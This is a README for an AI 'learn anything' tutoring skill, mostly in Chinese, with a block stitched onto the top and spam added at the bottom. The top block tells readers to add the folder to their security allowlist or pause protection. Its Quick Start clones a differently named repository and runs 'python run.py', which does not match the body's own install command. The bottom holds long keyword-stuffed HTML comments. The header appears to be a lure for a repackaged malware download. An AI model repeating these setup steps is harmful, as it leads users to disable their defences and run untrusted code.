# Learn Anything Skill


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/joincanarysteal/learn-anything-with-AI-hub.git
cd learn-anything-with-AI-hub
python run.py
```


![License](https://img.shields.io/badge/license-MIT-green.svg) ![Agent Skill](https://img.shields.io/badge/Agent%20Skill-learn--anything--skill-111827) ![Language](https://img.shields.io/badge/language-Chinese%20first-orange) ![Method](https://img.shields.io/badge/method-Project--Driven%20%2B%20Mastery%20Learning-blue) ![Open Source](https://img.shields.io/badge/open%20source-GitHub-black)

[English README](./README.en.md)

一个面向“学习任何知识”的通用 AI 学习 Skill，让 AI 成为你的顶级私教。  
它默认扮演 **导师 + 项目教练**：用中文主讲，温柔鼓励，专业幽默；不只解释概念，还会诊断起点、制定计划、组织项目化练习、检查掌握度，并在你没给资料时主动补官方文档与权威材料。

> 把 AI 从“会回答问题”推进成“能带你真的学会”的学习搭子。

## 图文和视频介绍

<table>
  <tr>
    <td align="center" width="50%">
      <strong><a href="http://xhslink.com/o/4DLignz1LpA">项目图文介绍</a></strong><br />
      <a href="http://xhslink.com/o/4DLignz1LpA">
        <img src="./docs/images/project-intro-cover.png" alt="learn-anything-skill 项目介绍" height="320" />
      </a>
    </td>
    <td align="center" width="50%">
      <strong><a href="http://xhslink.com/o/4DLignz1LpA">小白保姆级视频教程</a></strong><br />
      <a href="http://xhslink.com/o/4DLignz1LpA">
        <img src="./docs/images/video-tutorial-cover.png" alt="learn-anything-skill 视频教程封面" height="320" />
      </a>
    </td>
  </tr>
</table>

## 快速导航

[简介](#简介) · [推荐学习目录工作流](#推荐学习目录工作流) · [快速开始](#快速开始) · [详细教程](#详细教程) · [目录结构](#目录结构) · [适用主题](#适用主题) · [开发与定制](#开发与定制) · [兼容性说明](#兼容性说明)

## 简介

`learn-anything-skill` 是一个可移植的 `SKILL.md` 工作流包，核心目标不是“回答问题”，而是 **帮助用户真的学会**。

- 默认角色：`导师 + 项目教练`
- 默认方法：`项目驱动学习 + Mastery Learning`
- 默认产出：学习计划、学习笔记、课后复盘、项目任务书、掌握度检查、错题/卡点记录
- 默认行为：把关键学习产出写入当前工作目录下的 Markdown 文件，而不只停留在聊天记录里
- 默认来源策略：优先官方文档、原始资料、经典教材、权威机构材料，并区分事实依据与建议判断
- 默认项目化方式：
  - 编程主题：最小 demo、微项目、调试任务、小型任务书
  - 非编程主题：研究短报告、演讲提纲、案例分析、知识地图、读书笔记、复盘文档

适合：

- 想系统学习一个新主题的人
- 想把“知道”推进到“会用、会改、会迁移”的人
- 想把学习过程产品化、项目化、可复盘的人
- 想把 Skill 开源给 Codex / Claude Code / OpenCode 用户复用的人

## 推荐学习目录工作流

推荐不要直接在杂乱的工作目录里学习，而是先单独新建一个学习目录，再在这个目录里调用 Skill。

例如你想系统学习 AI，可以先创建：

```bash
mkdir -p learn-ai
cd learn-ai
```

然后在这个目录里使用 `learn-anything-skill`。

这样做的好处是：

- 学习计划会自动保存为 Markdown 文件
- 学习笔记会持续追加和沉淀
- 课后复盘、掌握度检查、错题/卡点记录会留在同一个目录
- 一个主题的资料、练习、笔记和项目任务书不会和其他项目混在一起

默认情况下，Skill 会优先把学习产出写到当前工作目录下的 `study/` 子目录，例如：

```text
learn-ai/
└── study/
    ├── ai-learning-plan.md
    ├── ai-notes.md
    ├── ai-session-review.md
    ├── ai-mastery-check.md
    └── ai-mistakes-log.md
```


### 1. 安装 Skill

推荐用 Agent Skills CLI：

```bash
npx skills add read2017/learn-anything-with-AI --skill learn-anything-skill
```

如果想全局安装：

```bash
npx skills add -g read2017/learn-anything-with-AI --skill learn-anything-skill
```

### 2. 创建学习目录

```bash
mkdir -p learn-ai
cd learn-ai
```

### 3. 开始学习

```text
用 $learn-anything-skill 帮我学习 SQL。
我会一点 Python，但没系统学过数据库。
请给我一个 4 周学习计划，并设计一个小项目任务书。
```

## 详细教程

首页只保留最短路径。更完整的安装、平台适配、调用方式、案例和提示词请看独立文档：

- 中文详细教程：[docs/tutorial.md](./docs/tutorial.md)
- English tutorial: [docs/tutorial.en.md](./docs/tutorial.en.md)

如果你是第一次用，建议顺序是：

## 目录结构

```text
skills/
└── learn-anything-skill/
    ├── SKILL.md
    ├── agents/
    │   └── openai.yaml
    ├── references/
    │   ├── mastery-rubric.md
    │   ├── project-patterns.md
    │   ├── source-strategy.md
    │   └── teaching-playbook.md
    └── assets/
        ├── learning-plan-template.md
        ├── mistakes-log-template.md
        ├── mastery-check-template.md
        ├── project-brief-template.md
        ├── session-review-template.md
        └── study-notes-template.md
```

## 适用主题

这个 Skill 不是只给程序员用的。它适用于：

- 编程与软件工程
- 数学与统计
- 经济学与金融基础
- 英语和其他语言学习
- 历史、社会科学、人文阅读
- 写作、演讲、表达训练
- AI / LLM / 数据相关主题

## 开发与定制

如果你想改成自己的版本，最常见的修改点有：

- 改默认语气与输出语言
- 改项目风格：更偏考试、论文、实战或作品集
- 改资料策略：更强调官方文档或教材精读
- 改掌握度检查方式：更偏题目、口头复述、代码实现或论文解读

建议优先修改这些文件：

- `skills/learn-anything-skill/SKILL.md`
- `skills/learn-anything-skill/references/source-strategy.md`
- `skills/learn-anything-skill/references/project-patterns.md`
- `skills/learn-anything-skill/references/mastery-rubric.md`

## 兼容性说明

- **OpenAI / Codex / ChatGPT Skills**：这是最原生的目标形态
- **Claude Code**：可直接作为 Skill 使用；如果要发布给更多人，建议再包装成 plugin
- **OpenCode**：建议作为 command 适配，而不是假设它与本仓库的 Skill 目录完全同构
- **其他兼容 Agent Skills 的工具**：推荐优先使用 `npx skills add`

换句话说：这个仓库的核心资产是通用的 `SKILL.md + references + assets` 工作流；不同代理工具的安装入口不完全一样，但内容本身是可迁移的。

<details>
<summary><strong>展开查看参考资料</strong></summary>

以下官方资料对本仓库的安装说明和兼容性表述有帮助：

- OpenAI Skills 说明：<https://openai.com/academy/skills/>
- ChatGPT Skills 帮助中心：<https://help.openai.com/en/articles/20001066>
- Codex 与 Skills 介绍：<https://openai.com/index/introducing-the-codex-app/>
- Claude Code Commands / Skills：<https://support.claude.com/en/articles/14553413-claude-code-cheatsheet>
- Claude Code Plugins：<https://code.claude.com/docs/en/plugins>
- OpenCode Commands：<https://opencode.ai/docs/commands>

</details>

## License

本仓库使用 [MIT License](./LICENSE)。


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- learn-anything-with-AI-hub - tool utility software - download install setup -->
<!-- cross platform learn-anything-with-AI-hub | learn-anything-with-AI-hub desktop | open source learn-anything-with-AI-hub mirror | lightweight learn-anything-with-AI-hub replacement | windows low latency learn-anything-with-AI-hub | top learn-anything-with-AI-hub sdk | best learn-anything-with-AI-hub service | example extensible learn-anything-with-AI-hub | source code learn-anything-with-AI-hub port | run on linux learn-anything-with-AI-hub | docs learn-anything-with-AI-hub web | download for windows learn-anything-with-AI-hub gui | how to use learn-anything-with-AI-hub mobile | learn-anything-with-AI-hub addon | learn-anything-with-AI-hub parser | free learn-anything-with-AI-hub | simple learn-anything-with-AI-hub plugin | learn-anything-with-AI-hub compressor | customizable learn-anything-with-AI-hub viewer | demo reliable learn-anything-with-AI-hub wrapper | wiki learn-anything-with-AI-hub viewer | fast learn-anything-with-AI-hub engine | modern learn-anything-with-AI-hub package | github powerful learn-anything-with-AI-hub analyzer | example advanced learn-anything-with-AI-hub | best learn-anything-with-AI-hub utility | download for mac portable learn-anything-with-AI-hub | fedora learn-anything-with-AI-hub api | centos learn-anything-with-AI-hub cli | learn anything with AI hub documentation | sample learn-anything-with-AI-hub api | build learn-anything-with-AI-hub viewer | offline learn-anything-with-AI-hub alternative | learn-anything-with-AI-hub debugger | 2025 learn-anything-with-AI-hub client | safe learn-anything-with-AI-hub | free download learn-anything-with-AI-hub tool | how to download reliable learn-anything-with-AI-hub | how to configure offline learn-anything-with-AI-hub editor | minimal learn-anything-with-AI-hub api | learn anything with AI hub saas | github learn-anything-with-AI-hub | run learn-anything-with-AI-hub plugin | ubuntu learn-anything-with-AI-hub extension | learn anything with AI hub automation | updated learn-anything-with-AI-hub tool | configurable learn-anything-with-AI-hub validator | setup learn-anything-with-AI-hub | new version minimal learn-anything-with-AI-hub framework | lightweight learn-anything-with-AI-hub port -->
<!-- high performance learn-anything-with-AI-hub parser | debian learn-anything-with-AI-hub server | windows learn-anything-with-AI-hub | windows learn-anything-with-AI-hub client | download for mac simple learn-anything-with-AI-hub | centos learn-anything-with-AI-hub binding | fedora learn-anything-with-AI-hub application | stable learn-anything-with-AI-hub | zip learn-anything-with-AI-hub platform | how to run learn-anything-with-AI-hub parser | native learn-anything-with-AI-hub checker | macos learn-anything-with-AI-hub optimizer | learn-anything-with-AI-hub framework | zip learn-anything-with-AI-hub scanner | example learn-anything-with-AI-hub clone | portable learn-anything-with-AI-hub | how to configure learn-anything-with-AI-hub validator | build learn-anything-with-AI-hub | new version learn-anything-with-AI-hub parser | how to configure learn-anything-with-AI-hub gui | open source learn-anything-with-AI-hub extension | walkthrough learn-anything-with-AI-hub debugger | how to configure learn-anything-with-AI-hub service | how to setup learn-anything-with-AI-hub package | docs modular learn-anything-with-AI-hub fork | how to build learn-anything-with-AI-hub | customizable learn-anything-with-AI-hub converter | use learn-anything-with-AI-hub | open learn-anything-with-AI-hub debugger | docs learn-anything-with-AI-hub decoder | deploy learn-anything-with-AI-hub web | learn-anything-with-AI-hub logger | macos lightweight learn-anything-with-AI-hub | open source learn-anything-with-AI-hub engine | ubuntu extensible learn-anything-with-AI-hub | learn-anything-with-AI-hub creator | launch learn-anything-with-AI-hub copy | offline learn-anything-with-AI-hub scanner | free learn-anything-with-AI-hub gui | simple learn-anything-with-AI-hub port | quickstart customizable learn-anything-with-AI-hub | download for linux learn-anything-with-AI-hub software | native learn-anything-with-AI-hub monitor | open source offline learn-anything-with-AI-hub | zip learn-anything-with-AI-hub gui | source code learn-anything-with-AI-hub | source code simple learn-anything-with-AI-hub | centos github learn-anything-with-AI-hub monitor | run on linux learn-anything-with-AI-hub logger | how to install learn-anything-with-AI-hub checker -->
<!-- offline learn-anything-with-AI-hub | how to use learn-anything-with-AI-hub desktop | free download lightweight learn-anything-with-AI-hub addon | setup learn-anything-with-AI-hub engine | learn-anything-with-AI-hub api | ubuntu portable learn-anything-with-AI-hub scanner | updated safe learn-anything-with-AI-hub | documentation learn-anything-with-AI-hub optimizer | tar.gz cross platform learn-anything-with-AI-hub decoder | how to install learn-anything-with-AI-hub sdk | download lightweight learn-anything-with-AI-hub | safe learn-anything-with-AI-hub tester | run learn-anything-with-AI-hub addon | offline learn-anything-with-AI-hub tracker | learn-anything-with-AI-hub plugin | native learn-anything-with-AI-hub | powerful learn-anything-with-AI-hub creator | learn-anything-with-AI-hub tool | self hosted learn-anything-with-AI-hub | wiki open source learn-anything-with-AI-hub port | learn anything with AI hub error | download for windows learn-anything-with-AI-hub | how to configure learn-anything-with-AI-hub | simple learn-anything-with-AI-hub utility | updated learn-anything-with-AI-hub | minimal learn-anything-with-AI-hub engine | online learn-anything-with-AI-hub service | safe learn-anything-with-AI-hub debugger | best learn-anything-with-AI-hub mirror | open source learn-anything-with-AI-hub sdk | tar.gz learn-anything-with-AI-hub server | wiki learn-anything-with-AI-hub library | execute learn-anything-with-AI-hub debugger | latest version learn-anything-with-AI-hub client | fast learn-anything-with-AI-hub replacement | learn-anything-with-AI-hub decoder | open source learn-anything-with-AI-hub platform | how to setup configurable learn-anything-with-AI-hub uploader | learn anything with AI hub devops | learn-anything-with-AI-hub application | getting started learn-anything-with-AI-hub | windows configurable learn-anything-with-AI-hub | fedora learn-anything-with-AI-hub | how to build learn-anything-with-AI-hub downloader | 2025 learn-anything-with-AI-hub mobile | easy learn-anything-with-AI-hub uploader | configure learn-anything-with-AI-hub binding | powerful learn-anything-with-AI-hub replacement | how to deploy learn-anything-with-AI-hub replacement | windows learn-anything-with-AI-hub application -->
<!-- simple learn-anything-with-AI-hub decoder | guide learn-anything-with-AI-hub platform | open native learn-anything-with-AI-hub | start learn-anything-with-AI-hub debugger | how to run learn-anything-with-AI-hub checker | how to setup learn-anything-with-AI-hub client | run on mac learn-anything-with-AI-hub program | free learn-anything-with-AI-hub downloader | configurable learn-anything-with-AI-hub library | modular learn-anything-with-AI-hub program | beginner learn-anything-with-AI-hub extractor | how to use learn-anything-with-AI-hub alternative | extensible learn-anything-with-AI-hub tool | macos best learn-anything-with-AI-hub | setup learn-anything-with-AI-hub validator | linux learn-anything-with-AI-hub | how to setup local learn-anything-with-AI-hub | learn anything with AI hub vs | learn anything with AI hub setup | learn anything with AI hub help | learn-anything-with-AI-hub web | guide learn-anything-with-AI-hub | centos learn-anything-with-AI-hub debugger | how to deploy learn-anything-with-AI-hub | launch learn-anything-with-AI-hub web | learn anything with AI hub test | powerful learn-anything-with-AI-hub extractor | execute learn-anything-with-AI-hub | walkthrough safe learn-anything-with-AI-hub | powerful learn-anything-with-AI-hub monitor | execute learn-anything-with-AI-hub fork | tar.gz learn-anything-with-AI-hub sdk | deploy learn-anything-with-AI-hub | get learn-anything-with-AI-hub converter | docs learn-anything-with-AI-hub | documentation safe learn-anything-with-AI-hub | learn-anything-with-AI-hub optimizer | debian best learn-anything-with-AI-hub | learn anything with AI hub best practice | production ready learn-anything-with-AI-hub scanner | getting started learn-anything-with-AI-hub parser | windows free learn-anything-with-AI-hub | production ready learn-anything-with-AI-hub app | how to configure learn-anything-with-AI-hub decoder | learn anything with AI hub review | download for mac learn-anything-with-AI-hub fork | reliable learn-anything-with-AI-hub | online learn-anything-with-AI-hub extension | high performance learn-anything-with-AI-hub tool | launch reliable learn-anything-with-AI-hub module -->
<!-- reliable learn-anything-with-AI-hub clone | use learn-anything-with-AI-hub cli | learn anything with AI hub workflow | download for windows learn-anything-with-AI-hub copy | advanced learn-anything-with-AI-hub creator | github learn-anything-with-AI-hub api | debian learn-anything-with-AI-hub module | github learn-anything-with-AI-hub parser | 2025 learn-anything-with-AI-hub library | run on mac free learn-anything-with-AI-hub | macos learn-anything-with-AI-hub gui | execute learn-anything-with-AI-hub server | github learn-anything-with-AI-hub decoder | walkthrough learn-anything-with-AI-hub | 2026 learn-anything-with-AI-hub module | powerful learn-anything-with-AI-hub fork | linux learn-anything-with-AI-hub extension | learn-anything-with-AI-hub validator | free download learn-anything-with-AI-hub extension | start learn-anything-with-AI-hub utility | configurable learn-anything-with-AI-hub addon | github learn-anything-with-AI-hub app | learn-anything-with-AI-hub platform | offline learn-anything-with-AI-hub tester | customizable learn-anything-with-AI-hub | modular learn-anything-with-AI-hub creator | download learn-anything-with-AI-hub | free self hosted learn-anything-with-AI-hub | macos learn-anything-with-AI-hub checker | minimal learn-anything-with-AI-hub application | open source learn-anything-with-AI-hub tracker | guide low latency learn-anything-with-AI-hub builder | open learn-anything-with-AI-hub | fedora learn-anything-with-AI-hub checker | learn-anything-with-AI-hub gui | compile low latency learn-anything-with-AI-hub | download customizable learn-anything-with-AI-hub | guide learn-anything-with-AI-hub library | examples learn-anything-with-AI-hub encoder | self hosted learn-anything-with-AI-hub monitor | tar.gz learn-anything-with-AI-hub editor | learn-anything-with-AI-hub reader | stable learn-anything-with-AI-hub creator | run on windows top learn-anything-with-AI-hub port | start learn-anything-with-AI-hub converter | portable learn-anything-with-AI-hub binding | learn anything with AI hub project | updated free learn-anything-with-AI-hub | quickstart learn-anything-with-AI-hub mirror | arch learn-anything-with-AI-hub debugger -->
<!-- cross platform learn-anything-with-AI-hub analyzer | simple learn-anything-with-AI-hub uploader | learn-anything-with-AI-hub converter | lightweight learn-anything-with-AI-hub downloader | beginner learn-anything-with-AI-hub sdk | minimal learn-anything-with-AI-hub debugger | use github learn-anything-with-AI-hub | learn-anything-with-AI-hub cli | updated self hosted learn-anything-with-AI-hub viewer | sample free learn-anything-with-AI-hub | configure learn-anything-with-AI-hub analyzer | secure learn-anything-with-AI-hub alternative | how to deploy learn-anything-with-AI-hub port | demo easy learn-anything-with-AI-hub mirror | guide configurable learn-anything-with-AI-hub logger | run learn-anything-with-AI-hub | github learn-anything-with-AI-hub generator | download for windows learn-anything-with-AI-hub parser | tutorial secure learn-anything-with-AI-hub | arch learn-anything-with-AI-hub encoder | tar.gz safe learn-anything-with-AI-hub | run on linux learn-anything-with-AI-hub optimizer | customizable learn-anything-with-AI-hub platform | free download learn-anything-with-AI-hub | source code portable learn-anything-with-AI-hub | guide local learn-anything-with-AI-hub generator | low latency learn-anything-with-AI-hub | secure learn-anything-with-AI-hub client | 2025 learn-anything-with-AI-hub optimizer | tutorial learn-anything-with-AI-hub module | low latency learn-anything-with-AI-hub web | getting started learn-anything-with-AI-hub scanner | run on linux learn-anything-with-AI-hub package | how to setup learn-anything-with-AI-hub | lightweight learn-anything-with-AI-hub | arch github learn-anything-with-AI-hub | learn-anything-with-AI-hub extractor | how to build simple learn-anything-with-AI-hub | stable learn-anything-with-AI-hub tracker | customizable learn-anything-with-AI-hub decoder | low latency learn-anything-with-AI-hub port | how to run learn-anything-with-AI-hub port | learn-anything-with-AI-hub server | learn anything with AI hub benchmark | how to deploy learn-anything-with-AI-hub checker | online learn-anything-with-AI-hub port | how to use learn-anything-with-AI-hub | updated learn-anything-with-AI-hub tester | launch learn-anything-with-AI-hub | learn anything with AI hub reference -->
<!-- run on linux learn-anything-with-AI-hub fork | get learn-anything-with-AI-hub api | deploy learn-anything-with-AI-hub extension | stable learn-anything-with-AI-hub debugger | advanced learn-anything-with-AI-hub sdk | stable learn-anything-with-AI-hub reader | how to deploy low latency learn-anything-with-AI-hub alternative | walkthrough learn-anything-with-AI-hub extractor | download for mac learn-anything-with-AI-hub tracker | documentation learn-anything-with-AI-hub analyzer | 2026 learn-anything-with-AI-hub extractor | examples learn-anything-with-AI-hub | reliable learn-anything-with-AI-hub copy | latest version advanced learn-anything-with-AI-hub | demo learn-anything-with-AI-hub server | tar.gz learn-anything-with-AI-hub | modern learn-anything-with-AI-hub plugin | how to install learn-anything-with-AI-hub downloader | fedora learn-anything-with-AI-hub program | low latency learn-anything-with-AI-hub framework | safe learn-anything-with-AI-hub cli | centos learn-anything-with-AI-hub parser | latest version learn-anything-with-AI-hub engine | safe learn-anything-with-AI-hub framework | run on windows learn-anything-with-AI-hub creator | launch powerful learn-anything-with-AI-hub alternative | wiki learn-anything-with-AI-hub utility | use learn-anything-with-AI-hub service | linux production ready learn-anything-with-AI-hub | self hosted learn-anything-with-AI-hub program | lightweight learn-anything-with-AI-hub encoder | execute learn-anything-with-AI-hub alternative | is learn anything with AI hub legit | native learn-anything-with-AI-hub library | examples stable learn-anything-with-AI-hub | tar.gz configurable learn-anything-with-AI-hub | configure learn-anything-with-AI-hub api | linux learn-anything-with-AI-hub analyzer | learn anything with AI hub webinar | quickstart learn-anything-with-AI-hub decoder | self hosted learn-anything-with-AI-hub builder | production ready learn-anything-with-AI-hub client | how to download learn-anything-with-AI-hub clone | example learn-anything-with-AI-hub replacement | how to download learn-anything-with-AI-hub | advanced learn-anything-with-AI-hub mobile | walkthrough modular learn-anything-with-AI-hub | fedora low latency learn-anything-with-AI-hub web | how to download learn-anything-with-AI-hub web | learn anything with AI hub pipeline -->
<!-- quickstart learn-anything-with-AI-hub service | tutorial learn-anything-with-AI-hub software | high performance learn-anything-with-AI-hub api | offline learn-anything-with-AI-hub service | free learn-anything-with-AI-hub plugin | low latency learn-anything-with-AI-hub scanner | walkthrough learn-anything-with-AI-hub scanner | fast learn-anything-with-AI-hub | how to setup learn-anything-with-AI-hub alternative | learn-anything-with-AI-hub builder | production ready learn-anything-with-AI-hub library | open source learn-anything-with-AI-hub | modular learn-anything-with-AI-hub builder | run on linux learn-anything-with-AI-hub gui | learn anything with AI hub support | use learn-anything-with-AI-hub fork | modular learn-anything-with-AI-hub tester | modular learn-anything-with-AI-hub | walkthrough learn-anything-with-AI-hub tester | ubuntu learn-anything-with-AI-hub logger | safe learn-anything-with-AI-hub copy | launch online learn-anything-with-AI-hub | download for mac learn-anything-with-AI-hub | quick start learn-anything-with-AI-hub validator | quick start native learn-anything-with-AI-hub | beginner learn-anything-with-AI-hub gui | run on linux local learn-anything-with-AI-hub | learn-anything-with-AI-hub library | learn anything with AI hub course | latest version reliable learn-anything-with-AI-hub web | native learn-anything-with-AI-hub server | cross platform learn-anything-with-AI-hub copy | how to configure reliable learn-anything-with-AI-hub | tutorial learn-anything-with-AI-hub editor | minimal learn-anything-with-AI-hub | example learn-anything-with-AI-hub cli | learn-anything-with-AI-hub checker | arch easy learn-anything-with-AI-hub | open learn-anything-with-AI-hub fork | advanced learn-anything-with-AI-hub editor | learn-anything-with-AI-hub clone | easy learn-anything-with-AI-hub port | documentation learn-anything-with-AI-hub program | lightweight learn-anything-with-AI-hub api | learn-anything-with-AI-hub sdk | download for linux learn-anything-with-AI-hub port | linux online learn-anything-with-AI-hub | learn anything with AI hub workshop | launch learn-anything-with-AI-hub analyzer | portable learn-anything-with-AI-hub builder -->
<!-- setup learn-anything-with-AI-hub debugger | best learn anything with AI hub | simple learn-anything-with-AI-hub parser | demo learn-anything-with-AI-hub clone | ubuntu learn-anything-with-AI-hub app | learn anything with AI hub guide | quick start reliable learn-anything-with-AI-hub | best learn-anything-with-AI-hub app | how to install learn-anything-with-AI-hub wrapper | top learn anything with AI hub | tutorial learn-anything-with-AI-hub | get learn-anything-with-AI-hub monitor | learn-anything-with-AI-hub client | fast learn-anything-with-AI-hub software | git clone learn-anything-with-AI-hub addon | source code learn-anything-with-AI-hub package | self hosted learn-anything-with-AI-hub application | fast learn-anything-with-AI-hub desktop | wiki modular learn-anything-with-AI-hub | download for mac learn-anything-with-AI-hub generator | free learn-anything-with-AI-hub encoder | how to configure learn-anything-with-AI-hub logger | learn anything with AI hub book | open source learn-anything-with-AI-hub uploader | install secure learn-anything-with-AI-hub | deploy learn-anything-with-AI-hub builder | 2025 learn-anything-with-AI-hub compressor | getting started learn-anything-with-AI-hub alternative | download for mac learn-anything-with-AI-hub library | run on windows learn-anything-with-AI-hub gui | latest version learn-anything-with-AI-hub | install learn-anything-with-AI-hub clone | latest version fast learn-anything-with-AI-hub | install stable learn-anything-with-AI-hub package | wiki learn-anything-with-AI-hub | extensible learn-anything-with-AI-hub converter | debian learn-anything-with-AI-hub | guide learn-anything-with-AI-hub monitor | updated learn-anything-with-AI-hub converter | linux learn-anything-with-AI-hub debugger | reliable learn-anything-with-AI-hub optimizer | high performance learn-anything-with-AI-hub desktop | tutorial learn-anything-with-AI-hub port | self hosted learn-anything-with-AI-hub client | learn anything with AI hub reddit | git clone stable learn-anything-with-AI-hub | how to setup learn-anything-with-AI-hub mobile | open low latency learn-anything-with-AI-hub | wiki production ready learn-anything-with-AI-hub | learn-anything-with-AI-hub software -->
<!-- configure configurable learn-anything-with-AI-hub | centos learn-anything-with-AI-hub | lightweight learn-anything-with-AI-hub sdk | download for windows learn-anything-with-AI-hub validator | local learn-anything-with-AI-hub | github learn-anything-with-AI-hub utility | getting started learn-anything-with-AI-hub clone | offline learn-anything-with-AI-hub addon | download for linux learn-anything-with-AI-hub application | learn anything with AI hub podcast | learn-anything-with-AI-hub utility | native learn-anything-with-AI-hub copy | use learn-anything-with-AI-hub client | free learn-anything-with-AI-hub replacement | 2025 secure learn-anything-with-AI-hub | build learn-anything-with-AI-hub reader | learn anything with AI hub alternative | download self hosted learn-anything-with-AI-hub | documentation advanced learn-anything-with-AI-hub | online learn-anything-with-AI-hub engine | source code stable learn-anything-with-AI-hub | how to run learn-anything-with-AI-hub | learn-anything-with-AI-hub copy | use learn-anything-with-AI-hub engine | macos local learn-anything-with-AI-hub mobile | github learn-anything-with-AI-hub optimizer | high performance learn-anything-with-AI-hub sdk | documentation secure learn-anything-with-AI-hub | 2025 low latency learn-anything-with-AI-hub clone | learn-anything-with-AI-hub mobile | walkthrough self hosted learn-anything-with-AI-hub clone | online learn-anything-with-AI-hub validator | run on mac learn-anything-with-AI-hub | configure learn-anything-with-AI-hub plugin | demo learn-anything-with-AI-hub reader | simple learn-anything-with-AI-hub software | stable learn-anything-with-AI-hub compressor | production ready learn-anything-with-AI-hub desktop | native learn-anything-with-AI-hub package | documentation learn-anything-with-AI-hub client | stable learn-anything-with-AI-hub utility | linux learn-anything-with-AI-hub reader | safe learn-anything-with-AI-hub builder | learn-anything-with-AI-hub tester | wiki learn-anything-with-AI-hub port | docs free learn-anything-with-AI-hub | low latency learn-anything-with-AI-hub engine | download for linux learn-anything-with-AI-hub addon | download for windows free learn-anything-with-AI-hub tool | run on mac learn-anything-with-AI-hub parser -->

<!-- Last updated: 2026-06-09 18:57:58 -->
